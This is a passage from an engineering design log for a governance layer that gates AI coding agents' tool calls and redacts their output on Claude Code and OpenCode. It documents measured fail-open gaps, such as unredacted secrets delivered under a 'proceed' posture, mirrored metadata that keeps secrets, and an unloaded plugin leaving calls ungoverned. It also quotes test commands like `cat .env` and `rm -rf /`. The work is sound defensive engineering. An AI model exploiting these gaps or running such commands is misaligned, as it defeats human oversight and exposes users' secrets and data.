**⚠️ Correction — `modifications.modified_content` has no applicable target on this host at *either* gate.** §V3 recorded that this adapter has no mapping from an opaque replacement string onto `updatedInput`, an arguments object. The result gate refuses it for the same reason: `updatedToolOutput` must match a structured output shape. That upgrades V3's note from "this adapter has no mapping" to "**this host has no target**", which is the stronger statement V7's matrix should carry. Stated precisely for that matrix: both documents §6.3's pointers can address here are field-addressed structures, and an opaque string is a field of neither — so this is a fact about the payload shapes the two gates govern, not a gap in §6.3 and not a missing branch in the adapter. A step whose payload *is* an opaque body would have an obvious target for it.

**⚠️ Watch-for, measured by V4 and answered by the posture rather than by this gate — a result payload that does not *carry* the named leaf delivers the unredacted output, with the Guardian never asked.** `buildEnvelope` throws when the hookmap's `outputs.from` path (`$.tool_response.stdout` in the shipped map) does not resolve against the payload, and that throw is deliberate: a result envelope carrying no output would ask the far end to govern a step whose output it cannot see. But it lands in `governStep`'s **`"request"`** stage — nothing has been asked of anything yet — so it is a *delivery* failure, and the negotiated `on_decision_failure` answers it. State the consequence, not just the routing: under `proceed`, which is the spec default, what this deployment ships, and what governs whenever **no session was negotiated at all**, the full unredacted tool output goes to the model, the audit line records a fail-open proceed, and no Guardian is ever consulted. A host can cause it legitimately — Claude Code fires one `PostToolUse` for every tool it is registered against, and any tool whose response is not shaped like `Bash`'s lands here. What keeps it off the live path today is the **matcher**, anchored `^Bash$`, so the exposure is the matcher's to hold rather than the gate's.

**And it is deliberately *not* the case V4 blocks at exit 2** — `govern-step.ts` draws that line on purpose and the prose should keep it. A leaf that is present and **non-string** is refused before any decision is sought (`assertOutputIsReplaceable`), because that gate can ask and then could not act on any answer it gets, so asking would mean dropping an arriving decision. A leaf that is **absent** leaves the gate with no ACS request either, so there is a posture's question to answer and answering it drops nothing. What separates them is what each failure leaves this gate *able to do*, never whose fault it is. Recorded here because the measurement was V4's (Task 2's review) and what survived it — `packages/host-adapter/src/govern-step.ts` and a clause in [`docs/demos/v4-runbook.md`](../demos/v4-runbook.md) — states the mechanism without the consequence.

**⚠️ Watch-for — a redaction can be honourable, apply cleanly, and still change nothing the model reads.** §6.3's pointers address the *whole* ACS result payload, and that payload carries fields beside the one leaf this gate can hand back (`exit_status`, `tool.name`). So `redactions: [{path: "/exit_status"}]` has a real target, applies exactly as written, leaves `/outputs/0/value` untouched — and the replacement projected from it is the output the host is already holding. Measured: `updatedToolOutput` came back carrying `stdout: "TOKEN=ghp_ABCDEF123456"` beside `additionalContext: "redaction_applied"`. Nothing is malformed and nothing warns, because the shape is perfectly valid; the model reads the real secret and is told in the same breath that it was redacted, and the audit trail agrees with the transcript rather than with what happened. It is the twelfth fail-open's family reached from the other side — not a replacement the host discards, but a replacement identical to the original — and it is refused as a withholding deny. The refusal asks whether the rewrite *reached the leaf*, not whether its pointer looked like the leaf's: an ancestor pointer (an override replacing the whole `outputs` array) does land, and a pointer comparison could never say whether the value under it changed. One consequence stated for V7: a redaction that replaces the leaf with the value it already held is refused too, on the same evidence, which is an over-refusal on the safe side. That over-refusal is unreachable with the **shipped config** rather than unreachable outright — `policy/lib/redact.rego` takes its replacement from the user-editable `data.agt.defaults.config.redact.replacement`, and a replacement equal to the matched text (or a zero-width match with an empty replacement) yields an identical value, at which cost a legitimate tool result is withheld entirely.

**⚠️ Watch-for, found by Task 8's review and NOT closed in V4 — the landing check above asks whether the *leaf* changed, not whether *every modification* landed.** So a `modifications` object **bundling** a leaf edit with a non-leaf one passes: the leaf changed, the non-leaf edit was silently dropped, and the whole `modify` is reported applied. Measured, all four — a `/outputs/0/value` redaction beside a `/exit_status` redaction, beside an `exit_status` override, beside a `/tool/name` redaction, and an `outputs` override carrying a second element nothing projects. Each of those non-leaf edits **alone** is correctly denied; it is the bundling that hides it. Nothing leaks, because the leaf edit did land, so what this leaves is a false audit and transcript record — but it is a best-effort partial apply reported as a full one, which is precisely what `modifications.ts`'s own header forbids, reached one seam later than that header can see. Reachability is the same class as the refused case above: `mapVerdict` emits exactly one redaction, so this bundle cannot come out of the pinned bundle — which is the same reason the refused case needed guarding at all. **Pinned as current behaviour** so that closing it is a visible change rather than a silent one.

**⚠️ Watch-for, the symmetric hole at the *request* gate, also not closed in V4.** The same question goes unasked where a step decides whether to *run*, and nothing downstream asks it either. Measured: `validateDecision` with `parameter_overrides: {command: "cat .env"}` against arguments `{command: "cat .env"}` returns `modify` with `applied_input {"command":"cat .env"}`. The policy said rewrite, nothing was rewritten, the original command runs, and the audit trail says the decision was honoured — this branch's own fail-open family, one gate over from the one V4 closed.

**The repair for both is one check, and it is deliberately not V4's.** A leaf-shaped comparison has no analogue at the request gate, because a request payload has no single leaf: the honest form is "every modification changed the document at its **own** target", a per-modification comparison inside `modifications.ts`'s apply step, where both documents and every target are already in hand. Done there it closes the bundled case and the request gate at once, which is the argument for doing it once rather than twice by gate.

**⚠️ Corrected by V5, which built it and measured that the paragraph above is wrong on its central claim.** One check does **not** close both. Run against the three bundles recorded here, a per-modification "did this target change" comparison passes **all three** — every declared target genuinely moves: `/exit_status` goes `"success"` → `"failure"`, `/tool/name` goes `"Bash"` → `"[REDACTED]"`, and the `outputs` override grows from one element to two. Nothing is a no-op, so there is nothing for a value comparison to catch.

The two holes are not one hole seen from two gates. They are different questions:

- **The request-gate hole is about value.** A `parameter_overrides` rewriting a command to itself leaves its own target as it found it. A per-target comparison catches exactly this, at either gate, knowing nothing about which target is special — so it lives in `modifications.ts` and is gate-agnostic, as this paragraph said it should be.
- **The result-gate bundle hole is about *observability*.** Its non-leaf half changes the ACS document perfectly legitimately; what makes it a false report is that **only `outputs[0].value` is ever projected onto the host's output object**, so the edit reaches nothing downstream. Telling that apart needs to know which target is the projected leaf — knowledge `modifications.ts` deliberately does not have, and cannot acquire without becoming gate-aware, which is the property that lets both gates share it.

So V5 ships **two** checks, each in the file that already holds what it needs: the per-target comparison in `applyModifications`, and a second comparison in `projectAppliedOutput` that asks whether the applied document differs from the original **anywhere but the projected leaf**. The "one check" instinct was right that the request gate needed a leaf-free form and wrong that the same form answers the result gate; what the two share is the failure they prevent, not the question they ask. Recorded here, at the rows it governs, on the same precedent as V4's audit-entry watch-for above: a finding this shape otherwise reaches nobody. What makes deferring it safe rather than merely cheap — `mapVerdict` synthesizes one modification from the bound `$policy_target` and throws otherwise, so no Guardian in this deployment emits a no-change rewrite, and the failure is a false record rather than a decision bypassed.

**⚠️ Amendment — the config ships, and a second config is forbidden.** `redact` lands in `policy/lib/data.json` beside `patterns`, and `policy/manifest.yaml` gains a `post_tool_call` point (`policy_target: "$.tool_result.outputs[0].value"`, `policy_target_kind: tool_result`). Both edits are additive; the full suite was unchanged by them when measured during planning (347 pass, 1 skip, 0 fail) — a baseline the review redistribution has since moved to 396 pass, 1 skip, 0 fail, so V4 re-measures rather than trusting it. A *separate* config document was considered and rejected — config lives inside the bundle directory (V1's amendment), so a second config means a second **bundle**, i.e. a fork of the pinned `.rego` files, which is exactly what R2.2/R2.3 forbid and `verify:pin` exists to catch. §V3's `manifest.drift.yaml` is not the precedent it resembles: a second *manifest* over the same `bundle: lib` is cheap, a second *config* is not. Consequence: `docs/demos/v3-runbook.md` says this rule was "reverted after", which V4's PR corrects — the rule now ships.

**Scope added at planning** (all amend this slice, all land in V4's PR):
- **S1's `decisions` block becomes per-hook**, and `N3`'s signature gains the hook name — its affordance row is amended with the change, not after it. See the correction above; the field-name half is already done.
- **The fourth invariant gate is *widened*, not added.** It already exists in `test/invariants.test.ts` and passes, asserting that `packages/host-adapter/src` names none of `permissionDecision`, `permissionDecisionReason`, `updatedInput`, `hookSpecificOutput` — landed by PR #10's review. V4 adds `updatedToolOutput`, the one term its own work could get wrong, and mutation-tests that term specifically: the other four pass whether or not the fifth is in the list. This project turns architectural claims into grep gates rather than prose.
- **Array-index descent, in `N7`'s extracted `modifications.ts`.** `/outputs/0/value` is *the* redaction path for a result payload and is rejected today (V3 rejected array descent because a naive `setAtPath` rewrites the array as `{"0": …}`). Arrays are now edited in place, with every existing guard — reserved segments, absent targets, disjointness — untouched. PR #12's review moved `applyModifications` out of `validateDecision` into its own module, so this lands there.
- **`exit_status` is a hookmap literal `success`.** Claude Code fires a separate `PostToolUseFailure` event (present in 2.1.227's hook schema) which this slice does not wire, so `PostToolUse` genuinely means success — recorded as a known gap rather than derived from a field that does not carry it. V7's matrix gets the cell.

**Parked → V5: a per-modification landing check, closing two holes V4 found and recorded.** V4 shipped a landing check that asks *did the leaf change*, and that is narrower than the claim a `modify` makes. ~~The honest form is one check, not two — **"every modification changed the document at its own target"**, per-modification, in the apply step — and it closes both of the holes recorded above together.~~ **⚠️ Retracted by V5, which built it: it is two checks, and the correction is recorded in full at the paragraph above.** The two holes this parks are the bundle whose non-leaf half is silently dropped (result gate) and the `parameter_overrides` that rewrites a value to itself (request gate) — and they turn out to ask different questions, *observability* and *value* respectively, which is why one comparison cannot answer both. Struck through rather than deleted, and struck through **here** as well as above, because this paragraph is the one two later passages cite as carrying the measurement: leaving a retracted claim standing at the row other rows point at is how the claim survived three documents in the first place. **Only one of the two is pinned.** Four tests in `packages/host-adapter/test/validate-decision.test.ts` — named `(recorded, not closed)` — pin the **result-gate bundle** half and will fail when the check lands, which is their purpose. The **request-gate** half has no test at all: it is recorded in prose here and in a note in `resolveModify`, and nothing fails if it silently changes. So the two holes are not equally defended, and the unpinned one is the one a second host inherits.

**Assigned to V5 because a second host makes the request-gate half worse rather than better** — V5's whole claim is that the shared apply step is inherited unchanged, so it inherits this too, and the hole stops being one host's. Whoever builds it must also rule on what a legitimately no-change modification *means*, which is the same question V4's identity over-refusal raises at the other gate. Neither hole is reachable through the shipped bundle (`mapVerdict` emits exactly one redaction), which is why V4 recorded rather than closed them — the guard exists for a Guardian this deployment does not ship, which is the point of a wire contract. A later planner may move this; it is recorded with a destination rather than left ownerless.

**Framing discipline (R4.3).** The claim is that per-host modules freeze capability at the moment they are written, while one contract picks up new host capability for every runtime at once. It is not that AGT got something wrong. Their README was accurate when written.

**And it is accurate now (R4.4).** Quoted in full from `agent-governance-claude-code/README.md:39` at the pinned ref, under its own heading **"## Important parity gaps"**: *"`PostToolUse` in Claude cannot reliably redact tool output after the tool has already executed, so this package does not claim Copilot-style output suppression parity."* Read precisely: "cannot **reliably**", and "does not **claim** parity" — a scoping statement about the package, not an assertion that the host cannot do it. The two watch-fors above are exactly *why* that wording is right. What V4 shows is that meeting the reliability condition is a contract-level job done once, not a per-host module's job redone for every runtime.

Plan: `docs/superpowers/plans/2026-08-11-v4-output-redaction.md`.

---

## V5: Second host, zero AGT changes

**Demo:** Same Guardian, same bundle, same policy. OpenCode is now governed. `git diff` shows zero lines changed in the Guardian, the bridge, or AGT — the one deployment-side edit is a manifest `tools:` entry, because OpenCode names its shell tool `bash` where Claude Code names it `Bash`. ⚠️ *Corrected from "same manifest" during execution; see the correction below for what the claim was always about and why it survives intact.*

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U10 | P2 | opencode | prompt input | type | → N10 | — |
| U11 | P2 | opencode | tool decision surface | render | — | — |
| U12 | P2 | opencode | redacted tool output | render | — | — |
| N10 | P2 | acs-plugin shim | OpenCode plugin hooks: `tool.execute.before`, `tool.execute.after` ⚠️ *amended — see the correction below* | call | → N11 | — |
| N11 | P2 | `@acs/host-adapter` | `buildEnvelope()` — same module as N2 | call | → N13 | — |
| N12 | P2 | `@acs/host-adapter` | `renderDecision()` — same module as N3 | call | → U11, → U12 | — |
| N13 | P2 | `@acs/host-adapter` | `createGuardianClient().requestDecision()` — same module as N4 | call | → N20 | → N16 |
| N14 | P2 | `@acs/host-adapter` | `negotiateSessionConfig()` — same module as N5 | call | → N28 | → S15 |
| N15 | P2 | `@acs/host-adapter` | `applyFailurePosture()` — same module as N6 | call | → S16, → N12 | — |
| N16 | P2 | `@acs/host-adapter` | `validateDecision()` — same module as N7 | call | → N12, → N15 | — |
| S2 | P2 | store | `opencode.hookmap.yaml` | — | — | → N11, N12 |
| S15 | P2 | store | `negotiated session config` | — | — | → N15 |
| S16 | P2 | store | `audit sink` | — | — | → N51 |

**This is the slice the whole project exists for.** The demo is the diff, not the feature. Two new artifacts — a shim and a hookmap — against zero changes anywhere else.

**⚠️ F2 resolved during V5 planning — both are expressible, and the shapes are not the ones this row assumed.** Measured by running OpenCode **1.18.15** against a plugin that mutates what the hooks hand it, driven by a local deterministic model endpoint so the tool path is real and the run costs nothing. Evidence in `docs/superpowers/plans/2026-08-12-v5-second-host.md`.

*Modify* is the straightforward half at both gates: `tool.execute.before` hands the plugin a mutable `{args}`, `tool.execute.after` a mutable `{title, output, metadata, attachments}`, and both hooks return `void` — so the channel is **mutation in place**, never a returned document. *Deny* is the awkward half and has no field at all: writing `output.status = "deny"` and `output.decision = "deny"` is **accepted and ignored**, and the tool still runs. The only refusal is a **throw**.

**⚠️ Correction — `N10` named two hooks that do not exist.** The row above read "`session.start`, `event`, `tool.execute.before/after/error`". In 1.18.15 there is **no `session.start`** (the generic `event` stream carries `session.created`) and **no `tool.execute.error`** — a declared one was never dispatched, including on a run where the tool failed. `event` is not wired either, because `sessionID` arrives on *both* tool hooks, so the shim reads it there. Two hooks, and the row now says so.

**⚠️ Watch-for — a sibling that *duplicates* the leaf, and it inverts V4's central safety property.** `tool.execute.after`'s `metadata` carries **its own copy of the output**. §V4 withholds by patching a *clone of the object the host handed it*, so "every sibling field survives by construction" — exactly right on Claude Code, where the siblings are `stderr` and `interrupted`. Here one sibling mirrors the leaf, so **preserving it preserves the secret**. Measured with a command whose own text carries nothing (`cat secret.txt`): the model correctly received `[REDACTED]` — the `message` table holds zero copies — while the persisted part kept `metadata.output: "TOKEN=ghp_ONLYINOUTPUT999\n"`. Nothing is malformed and nothing warns. It is the twelfth fail-open's family reached from a third side: not a replacement the host discards (V4), not a replacement identical to the original (V4), but a replacement that lands while a sibling keeps what it replaced. S2 therefore declares `outputs.mirrors`, and `replacingOutput` refuses to hand back a replacement in which the withheld value survives.

**⚠️ Watch-for — a result-gate `deny` must be a *mutation*, not a throw, and this is V4's finding with the mechanism reversed.** Throwing in `tool.execute.after` genuinely withholds from the model — `status: "error"`, no `output` field — which is *better* than Claude Code, where §V4 measured that `decision: block` delivers the real stdout beside the reason. But OpenCode **discards the plugin's mutations on the throw path** and rebuilds `metadata` from its own pre-hook copy, so the mirror keeps the secret however early it is scrubbed. Measured: the plugin's own view of `metadata.output` was `[WITHHELD]` at the moment of the throw and the record kept the plaintext — and the rebuilt object had also lost `exit` and `truncated`, which is what proves it is a different object. So deny withholds by **replacing** the leaf and its mirrors. Same conclusion as V4 — a deny at a result gate goes through the modify mechanism — reached from the opposite host mechanism.

**⚠️ Correction — `exit_status` is a real field on this host.** §V4 shipped `exit_status: {literal: success}` because Claude Code's `PostToolUse` payload carries no exit code, and recorded the gap for V7. OpenCode's `metadata` is `{output, exit, truncated}`, so S2 reads `$.result.metadata.exit`. The gap is Claude Code's, not ACS's — which is the distinction V7's matrix has to carry.

**⚠️ Correction to §V4, which predicted this exactly — `modifications.modified_content` has an obvious target here.** §V4 upgraded V3's note to "**this host** has no target" at either gate, on the reasoning that both documents §6.3's pointers address are field-addressed structures, and closed with: *"a step whose payload is an opaque body would have an obvious target for it."* OpenCode's `tool.execute.after` hands the plugin `output.output` as an **opaque string**. So V7's matrix carries `modified_content` as red for Claude Code and **green for OpenCode**, not red outright. **V5 does not build it** — `mapVerdict` emitting `modified_content` is a *Guardian* change, and this slice's whole claim is that the Guardian does not change — but the matrix's claim moves, and now on measurement rather than prediction.

**⚠️ Correction, measured after the first hookmap shipped — `metadata` is *per tool*, and this gate had to be scoped the way host #1's already is.** The result-gate paths above (`metadata.exit`, `metadata.output`) are `bash`'s. Driving four tools through 1.18.15:

| tool | `metadata` keys | `exit` | `metadata.output` |
|---|---|---|---|
| `read` | `display`, `loaded`, **`preview`**, `truncated` | — | — |
| `grep` | `matches`, `truncated` | — | — |
| an invalid call — reported as tool **`invalid`**, not as the tool it tried to be | `truncated` | — | — |
| `bash`, succeeding | **`exit`** (`0`), **`output`**, `truncated` | ✅ | ✅ |
| `bash`, **failing** (`cat missing-file.txt`) | **`exit`** (`1`), **`output`** (the error text), `truncated` | ✅ | ✅ |

OpenCode fires `tool.execute.after` for **every** tool and has no matcher, so an unscoped hookmap sends every non-`bash` result into an unresolvable `exit_status` path — `buildEnvelope` throws, `governStep` answers at stage "request" with the negotiated posture, and under `proceed` (the spec default, and what this deployment ships) **the output is delivered ungoverned**. Host #1 is scoped to one tool too, by the anchored `^Bash$` matcher in its `settings.json`, and §V4 says the exposure is "the matcher's to hold rather than the gate's" — so the equivalent here is declared data (`tools: [bash]` on the result-gate entry) that the shim honours. ~~**The request gate takes no such list and governs every tool**: `$.tool` and `$.args` are present whatever ran.~~ ⚠️ **Retracted — see the correction below.** True of the hookmap's paths and irrelevant to what actually decides.

**⚠️ Corrected again during execution — the *request* gate needs the same list, and the reason is the manifest rather than the hookmap.** This section first ruled that the request gate takes no `tools:` because `$.tool` and `$.args` resolve whatever ran. That is true of the **hookmap** and irrelevant, because AGT resolves `policy/manifest.yaml`'s `pre_tool_call.policy_target` — `$.tool_call.args.command` — **before any rule runs**, and fails closed when it is absent. Measured through a live Guardian:

```
read / grep / write / edit / webfetch  ->  deny  runtime_error:path_missing
bash                                   ->  deny  runtime_error:tool_unknown
```

So an unscoped request gate does not govern every tool — it **blocks every tool call OpenCode can make**, `bash` on an unregistered name and everything else on a policy target that does not exist in its arguments. Both gates therefore carry `tools: [bash]`, which makes the two hosts symmetric rather than asymmetric: host #1 is Bash at both gates too, by the anchored `^Bash$` its `settings.json` applies to both. **For V7:** the matrix records equal coverage shapes and one shared reason — a deployment governs the tools whose arguments its policy target can address, and widening either host means a second target, not a second gate.

**⚠️ Corrected once more, in review round 3 — "declared data the *shim* honours" was the defect, not the design.** Everything above about *what* `tools: [bash]` is for stands; what did not is *where the rule lived*. The adapter shape-checked the list at load time and then had no opinion about what it meant, so the only code that acted on it was host #2's plugin — and a third host written from an existing shim would load a `tools:` list and govern every tool anyway, sending an envelope the manifest cannot express a target for into the negotiated posture. `governsTool` (`packages/host-adapter/src/govern-step.ts`) is now the single implementation of the rule that an absent list means "every tool", and `governStep` asks it before it builds anything, returning an empty output for a tool it does not govern. Each shim still asks the same function one call earlier — not redundancy: only the shim's call site is early enough to skip session validation and the handshake round trip as well. Two call sites, one rule — **but not one argument**: a shim passes the tool name off its own input field (`input.tool`), while `governStep` passes whatever that hook's `tool_name` path resolves to against the assembled payload. Both shipped hookmaps make those the same value — host #2's `tool_name: $.tool` names the very field its shim reads, and host #1 declares no `tools` at all — but a hookmap pointing `tool_name` at some other field would have its shim skipping on one name while `governStep` scopes on another, and nothing detects that, because the shim's field is a host-side value the adapter never sees.

**⚠️ Corrected in review round 4 — the paragraph above is history from "but not one argument" onward.** That divergence was measured costing a governed `bash` step returned as `stage: "ungoverned"` — no Guardian request, no decision, no audit entry, `rm -rf /` through — and it is closed. `governStep` no longer derives anything: `GovernStepInput.scopedTool` carries the tool the caller *already scoped on*, and a gate whose entry declares a `tools` list **refuses** a caller that names none, thrown outside every `try` a posture is consulted from (a posture-answered refusal would be an ungoverned step under `proceed` — measured, by moving the guard inside that `try`). The field is optional because host #1 declares no `tools` at either gate and its shipped source is frozen at `+0/-0` for this slice. `toolNameFor` is gone with it: once the tool is told and a declared list refuses an untold caller, nothing a payload-derived name computed could decide a skip.

Two things follow, and both are the honest residual rather than a tidier claim. **The caller is now authoritative about its own tool**, so a hookmap listing a name its host would never say — `tools: ["Bash"]` against a shim that dispatches `bash` — skips every call silently and unaudited, where the derived name used to govern it. That is not decidable in the adapter (two vocabularies differing is what a legitimate host with qualified tool names looks like), and — **corrected by the whole-branch review, this sentence claimed otherwise** — it is *not* closed at load time either. **And `assertEntryMatchesGate` stays for a different fault than it was built for:** re-measured with `tool_name: $.args.command` and the tool told, the step is governed and audited normally while the envelope carries `payload.tool.name: "rm -rf /"`, so the policy runtime is asked about a tool the deployment never registered (`deny`, `runtime_error:tool_unknown` — the registry, not this deployment's `rm -rf /` rule). A wrong question asked, not a question skipped — the same family as pointing `outputs.from` at the wrong leaf.

**⚠️ And a consequence for whoever adds `tools` to a THIRD host — measured in the same fix round.** An unlisted tool comes back from `governStep` carrying an *empty* rendered output, and what an empty render means is the host's, not the adapter's. On host #2's applier and at host #1's `PostToolUse` it is a clean no-op, which is the intended skip. At host #1's `PreToolUse` it is **exit 2** — that shim declares `emptyOutputIsHonest: false` there, treats an absent `hookSpecificOutput` wrapper as a thing it must not write, and throws. So on that gate the inherited behaviour is a blocking stop for every unlisted tool, with no audit entry. Fail-closed, so nothing runs ungoverned — a watch-for, not a regression — and unreachable today because host #1's hookmap declares no `tools`. `test/invariants.test.ts` now fails if one is ever added at a gate whose `emptyOutputIsHonest` is false, so it is unreachable by construction rather than by nobody having tried.

**⚠️ Corrected in review round 4 — "host #1's `PostToolUse` … a clean no-op" no longer holds, and the paragraph above is round-3 history.** `governStep` now refuses a gate that declares a `tools` list when its caller names no scoped tool, and acs-hook.ts names none — so on host #1 a `tools` line is a throw before any render, at the gate that declares it. Re-measured on this tree, real shim as a subprocess against a live Guardian, three hookmap configs × both gates × both tools, every payload carrying the same `tool_response` shape so only the tool *name* varies:

| hookmap config | invoked | exit |
|---|---|---|
| baseline (no `tools`) | all four combinations | 0 |
| `tools: [Bash]` at PostToolUse | PostToolUse / `Read` | **2** |
| `tools: [Bash]` at PostToolUse | PostToolUse / `Bash` | **2** |
| `tools: [Bash]` at PostToolUse | PreToolUse / either | 0 *(control)* |
| `tools: [Bash]` at PreToolUse | PreToolUse / either | **2** |
| `tools: [Bash]` at PreToolUse | PostToolUse / either | 0 *(control)* |

So: **exit 2 where the old capture said exit 0**, for the listed tool as much as an unlisted one; the blast radius is the *gate that declares the list*, not the tool (the control rows show the other gate untouched in both directions); and the stderr on every exit-2 row is `governStep`'s `scopedTool` refusal, not the applier's missing-wrapper message — the applier fault above is now *unreachable* through a `tools` list on this host, because the refusal preempts every render. Still fail-closed. **While `acs-hook.ts` is frozen at `+0/-0` and therefore cannot tell, host #1 cannot declare `tools` at any gate.** The invariants gate is deliberately *not* widened to match: the applier fault is permanent, while this freeze consequence dies the day the shim starts telling.

**For whoever widens it:** `read`'s `metadata.preview` carried the file's full contents in the measurement — so per-tool metadata means **per-tool mirrors**, and `outputs.mirrors` would need to become per-tool before a second tool could be governed at the result gate safely.

**One residual at this gate, measured and *not* reachable through the tool it governs.** A result payload carrying no `metadata.exit` makes `buildEnvelope` throw, which lands at stage `"request"` and is answered by the negotiated posture — so under `proceed` the unredacted output is delivered, audited as `host_configuration`. That is the correct seam by this branch's own rule (the fault needs the payload, so a posture answers it), and the question that matters is whether `bash` can produce it. Measured, both paths: a **succeeding** `bash` carries `exit: 0`, and a **failing** one carries `exit: 1` with the error text in `metadata.output`. So the governed tool always supplies the field, and the residual is unreachable through the shipped config rather than unreachable outright — the same class as V4's identity over-refusal. The fourth row above is not a counter-example: an invalid call reports itself as tool **`invalid`**, which `tools: [bash]` skips before any envelope is built.

**⚠️ Correction to this slice's own demo sentence — "same manifest" was an overclaim, and the honest version is stronger.** OpenCode names its shell tool `bash` where Claude Code names it `Bash`, and an unregistered `tool_call.name` fails AGT's evaluation closed before any rule runs. The manifest is the deployment's **tool registry**, so a deployment governing two hosts registers both hosts' names — additively, in `manifest.yaml` and `manifest.drift.yaml` alike. Normalising the name in the shim or the hookmap was considered and rejected: the tool genuinely *is* named `bash` here, and renaming it would make both the ACS envelope and S6's log misreport what ran. What the claim was ever about survives untouched — **zero Rego authored, `policy/lib` byte-identical under `verify:pin`, `data.agt.defaults.config` unchanged, and zero lines changed in the Guardian, the bridge or AGT.** The demo now says *"same Guardian, same bundle, same policy"* and names the one deployment-side edit instead of implying there was none.

**⚠️ Found at the very end of V5, and it is the sharpest asymmetry between the two hosts — this host has no blocking stop at load, so every load-time gate this slice built degrades to a *log line*.** Host #1's shim answers a broken deployment with `BlockingConfigurationError` → exit 2, and Claude Code honours it: the hook blocks. Host #2's plugin can only throw, and **OpenCode catches a throwing plugin factory, logs it, and continues with the plugin unloaded** — so every tool call afterwards runs ungoverned. Measured by removing `refuse.denied` from the hookmap, i.e. inducing exactly the fault `assertHostAcceptsEveryDecision` exists to catch (that gate was named `assertRefusalRendersUnconditionally` and covered the request gate alone when this was measured; §V5 review round 3, Task 5 generalised it to both gates, which widens what degrades to a log line rather than changing that it does): OpenCode logged `level=ERROR message="failed to load plugin"` and then ran `rm -rf /`.

Three consequences, and the third is the one a deployment has to act on:

1. **The load-time gates are still worth having** — they name the fault precisely, at the moment it is introduced, in a line an operator can grep. What they cannot do on this host is *stop the session*.
2. **A cosmetic loader complaint and total governance loss are byte-identical apart from the `error=` payload.** OpenCode calls **every exported function** of a plugin module with the registration context, so a stray export produces the same `failed to load plugin` line as a real refusal. V5 answers that structurally — the shim exports exactly one symbol, gated in `test/invariants.test.ts` — because the alternative is an operator trained to scroll past the only line that ever announces the governance layer is gone.
3. **One exported constant disables governance entirely.** Measured: a single **non-function** export beside a working factory yields `Plugin export is not a function` and the factory is **never called at all**. That is why the one-symbol rule is a gate rather than a convention.

For V7's matrix this is a real cell and not a footnote: *"a deployment-configuration fault is a blocking stop on host #1 and an unloaded plugin on host #2."* The contract expresses the refusal identically at both; what differs is what each host does with a shim that refuses to start, and that is not something ACS v0.1.0 can reach.

**⚠️ Note for V8 — `output.attachments` exists at runtime and is absent from 1.18.15's own `Hooks` type.** Harmless here, because the clone-and-patch discipline preserves a field nobody declared. Recorded because it is precisely the class of upstream divergence V8 watches for, in a package this slice now depends on.

**⚠️ Inherited from V4 — the per-modification landing check, and it is scope this slice absorbs.** V4 parked it here (see §V4's parked item for the measurements): the apply step reports a `modify` as applied when only part of it landed, and separately when a `parameter_overrides` rewrites a value to itself. ~~The honest form is one check — *every modification changed the document at its own target*.~~ **Corrected by building it: it is two checks, because the two holes ask different questions** — the request-gate one is about *value* (a target left as it was found) and the result-gate one is about *observability* (a target that genuinely changed but that nothing projects to the host). §V4's parked item carries the measurement. It is parked here precisely because **this slice's claim makes it worse.** "The shared apply step is inherited unchanged" is the demo; inheriting it unchanged inherits this, and the hole stops being one host's. Four tests in `packages/host-adapter/test/validate-decision.test.ts` pin the **result-gate** half as recorded gaps and will fail when it lands; **the request-gate half — the one this slice inherits — is pinned by nothing**, so it can drift silently between now and then. Also requires a ruling on what a legitimately no-change modification *means*, which is the same question V4's identity over-refusal raises at the result gate.

Two things this does **not** change about V5's demo, and both matter for the `git diff`: the work is in `packages/host-adapter`, which is the **shared** adapter rather than either host's shim, and it touches nothing in the Guardian, the bridge, or AGT. So the diff V5 shows stays zero where the claim is about, and the added lines land where both hosts already share code. The same argument covers `outputs.mirrors` (risk row 17), which is why that lands in the adapter rather than in the OpenCode shim: a shim-local workaround would be the per-host fork R3.4 forbids.

Plan: `docs/superpowers/plans/2026-08-12-v5-second-host.md`.

---

## V6: Session state and provenance carriage

**Demo:** The SessionContext chain grows per step. AGT emits `result_labels` at one step and receives them back as `input.ifc.source_labels` at the next, carried in the `IfcLabels` field of the ACS provenance record.

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U22 | P4 | inspector | session chain view: SessionContext entries and lineage | render | — | — |
| N22 | P3 | guardian | `appendContextEntry()` — hash-chained SessionContext | call | → S3, → N23 | — |
| N25 | P3 | guardian | `persistIfcLabels()` — AGT `result_labels` into the `IfcLabels` field ACS provenance carries | call | → S5 | — |
| S3 | P3 | store | `sessionContext`, hash-chained per `session_id` | — | — | → N23, → U22 |
| S4 | P3 | store | `intent`, immutable baseline per session | — | — | → N23 |
| S5 | P3 | store | `provenance` — `origin` / `derived_from`, plus an `IfcLabels` field carrying AGT's labels | — | — | → N23 |

**This is R8.1 made concrete.** AGT's `verdict.schema.json` says the core "stores and propagates nothing" and requires the host to persist labels and re-supply them. This slice is the Guardian doing exactly that job — the one AGT's spec asks a host to do and declines to standardize. Nothing here criticizes AGT; it fills a role AGT explicitly delegates.

Wire N21 → N22 → N23 in place of V1's direct N21 → N23.

**Shipped.** `slices/v6/README.md` maps each affordance to the file it lives in and records
each place where a shipped name differs from a frozen sentence.
`docs/demos/v6-runbook.md` is the run: the chain growing across two steps in real JSONL, a
label emitted by AGT at one step arriving at the next, and the captures every finding below
rests on.

**⚠️ The wire carries no label, so a session's first one is deployment-supplied — the same
shape as risk row 11 and D10, and a V7 matrix cell.** `spec/acs/specification/v0.1.0/provenance.json`
defines `provenance_id`, `origin`, `source_id` and `derived_from`, and no member a
sensitivity label could be read from. That object is what `hooks/tool-call-request.json`
`$ref`s from every argument, so even a deployment running the full ACS-Provenance profile —
provenance required on every argument, `provenance_producer: deterministic` — has nothing
on the wire to read a first IFC label out of. The near-miss is worth naming so nobody has to
rediscover it: that schema's own `description` reserves an OPTIONAL `trust` enum for
vendor implementations, which "extend this schema rather than rely on v0.1 to validate the
field" — so `trust` is absent from `properties`, is validated by nothing in v0.1.0, and is
a vendor extension rather than a field a conforming consumer could read a label from. AGT does not supply one either: it propagates
what it is given and originates nothing (`propagated_labels(labels)` returns `[]` for an
empty input), which is the delegation R8.1 is about. So V6's Guardian seeds each session at
`["public"]`, the lattice floor, and says so. **This resolves exactly as V3's drift score
does: green for the Guardian, red for a wire consumer** — a downstream ACS consumer cannot
reconstruct or originate a session's IFC labels, because the contract does not carry them.
Note about **ACS v0.1.0's** coverage, never about AGT. V7's matrix carries the cell.

**⚠️ Found by turning the gate on, and it is what makes the seed mandatory rather than a
preference — AGT's stock IFC gate is fail-closed on absent labels.** `flow_allowed_with_lattice`
